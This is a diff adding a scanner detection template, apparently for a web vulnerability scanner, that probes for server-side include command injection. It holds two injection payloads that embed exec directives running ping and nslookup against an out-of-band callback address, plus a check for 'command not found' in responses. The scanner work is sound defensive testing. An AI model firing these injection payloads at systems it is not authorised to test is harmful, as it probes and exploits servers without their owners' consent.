@@ -1,0 +1,25 @@
+id: "ssi_cmd_injection"
+issue_code: "ssi_injection"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 100
+  - response_condition:
+      contains: command not found
+      confidence: 70
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+  - name: test
+    value: "test"
+templates:
+  - <!--#exec cmd="ping -c 3 {{.oob_address}}" -->
+  - <!--#exec cmd="nslookup {{.oob_address}}" -->
+categories:
+  - ssi
+  - command_injection
+  - injection
+  - oob
+platforms:
+  - ssi
